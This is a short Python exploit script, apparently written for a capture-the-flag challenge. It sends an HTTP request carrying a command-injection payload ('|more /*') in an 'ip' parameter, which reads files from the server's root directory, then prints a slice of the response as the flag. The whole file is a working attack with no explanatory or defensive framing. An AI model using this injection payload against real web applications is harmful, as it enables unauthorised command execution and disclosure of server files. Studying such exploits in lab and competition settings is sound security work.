# !/usr/bin/python3
# -*- coding: utf-8 -*-
"""
@Author         :  Coward
@Version        :  
------------------------------------
@File           :  exp.py
@Description    :  
@CreateTime     :  2023/2/3 14:33
------------------------------------
@ModifyTime     :  
"""

from requests import get
from sys import argv

if __name__ == '__main__':
    try:
        url = argv[1]
    except Exception:
        print("python3 exp.py url")
    else:
        payload = '?ip=|more /*'
        flag = get(url+payload).text[145:161]
        print(flag)

